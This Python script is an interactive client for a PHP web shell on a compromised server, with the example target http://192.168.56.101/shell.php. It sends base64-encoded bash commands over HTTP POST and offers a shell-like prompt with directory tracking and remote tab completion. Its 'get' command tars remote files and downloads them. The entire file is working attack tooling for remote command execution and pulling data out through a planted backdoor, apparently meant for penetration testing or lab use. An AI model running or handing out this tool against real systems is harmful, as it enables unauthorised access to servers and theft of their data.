import atexit
import base64
import os
import re
import readline
import sys
import urllib.parse
import urllib.request

from queue import Queue
from threading import Thread
from time import strftime

if len(sys.argv) != 2:
    print('\nUsage: python3 {} URL\n'.format(sys.argv[0]))
    print('For example:\npython3 {} {}\n'.format(sys.argv[0], 'http://192.168.56.101/shell.php'))
    exit(0)
else:
    url = sys.argv[1]

downloads_directory = "downloads"

historyPath = os.path.expanduser("~/.pyshellhistory")
if os.path.exists(historyPath):
    readline.read_history_file(historyPath)

def save_history(historyPath=historyPath):
    readline.write_history_file(historyPath)

def exit_handler():
    # save cli history
    save_history()
    # tell the thread to quit
    q.put('>>exit<<')
    # clear any colors
    print(bcolors.ENDC)

atexit.register(exit_handler)

tab_complete = {}
def complete(text, state):
    tokens = readline.get_line_buffer().split()
    thistoken = tokens[-1]
    thisdir = os.path.dirname(thistoken)
    thispath = os.path.abspath(os.path.join(current_path, thisdir))
    if thispath != '/':
        thispath += '/'
    if thispath not in tab_complete:
        populateTabComplete(thispath)
    if thispath not in tab_complete:
        return False
    suffix = [x for x in tab_complete[thispath] if x.startswith(text)][state:]
    if len(suffix):
        result = suffix[0]
        if result[-1] != '/':
            result += ' '
        return result
    return False
readline.set_completer_delims(' /;&'"")
readline.parse_and_bind('tab: complete')
readline.set_completer(complete)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


timeout = 20
current_path = '/'

#print ("\nuse 'settimeout 30' to set the timeout to 30 seconds, etc\n")
def tabCompleterThread():
    while True:
        path = q.get()
        if path == '>>exit<<':
            break
        populateTabComplete(path)

def populateTabComplete(path):
    global tab_complete;
    entries = makeRequest(20, 'bash', '-c "cd {} && ls -p"'.format(path)).split("\n")[:-1]
    if entries:
        tab_complete[path] = entries

q = Queue(5)
t = Thread(target=tabCompleterThread)
t.setDaemon(True)
t.start()

def run():
    global timeout
    global url
    global current_path
    q.put('/')
    while True:
        try:
            inputstr = input('{}{} {}${} '.format(
                bcolors.OKBLUE,
                current_path,
                bcolors.WARNING,
                bcolors.ENDC))
        except EOFError:
            exit_handler()
            break
        parts = inputstr.split(' ', 1)
        if len(parts) == 1:
            parts.append(' ')
        if parts[0] == 'exit':
            q.put('>>exit<<')
            break
        if parts[0] == 'cd':
            if parts[1] == ' ':
                current_path = '/'
            else:
                current_path = os.path.abspath(os.path.join(current_path, parts[1])).strip()
            q.put(current_path)
            continue
        if parts[0] == 'get':
            path_to_download = os.path.abspath(os.path.join(current_path, parts[1])).strip()
            tgz = makeRequest(timeout, 'tar', 'cz {}'.format(path_to_download), noDecode=True)
            filename = path_to_download.replace('/', '_')+'.'+strftime("%Y%m%d%H%M%S")+'.tgz'
            if not os.path.exists(downloads_directory):
                os.makedirs(downloads_directory)
            f = open(os.path.join(downloads_directory,filename), 'wb')
            f.write(tgz)
            f.close()
            print('Saved as {}'.format(filename))
            continue
        if parts[0] == 'settimeout':
            timeout = int(parts[1])
            print('Timeout set to {} seconds'.format(timeout))
            continue

        cmd = 'bash'
        opts = '-c "cd {} 2>&1 && {} 2>&1"'.format(current_path, inputstr.replace('"', '\\"'))

        result = makeRequest(timeout, cmd, opts)
        print("{}{}".format(bcolors.ENDC, result))

def makeRequest(timeout, cmd, opts, noDecode=False):
    requestData = urllib.parse.urlencode({
        'timeout': timeout,
        'cmd': base64.b64encode(cmd.encode('ascii')).decode(),
        'opts': base64.b64encode(opts.encode('ascii')).decode()
    }).encode('ascii')

    result = urllib.request.urlopen(url, data=requestData).read()
    if noDecode:
        return result
    return result.decode()

run()
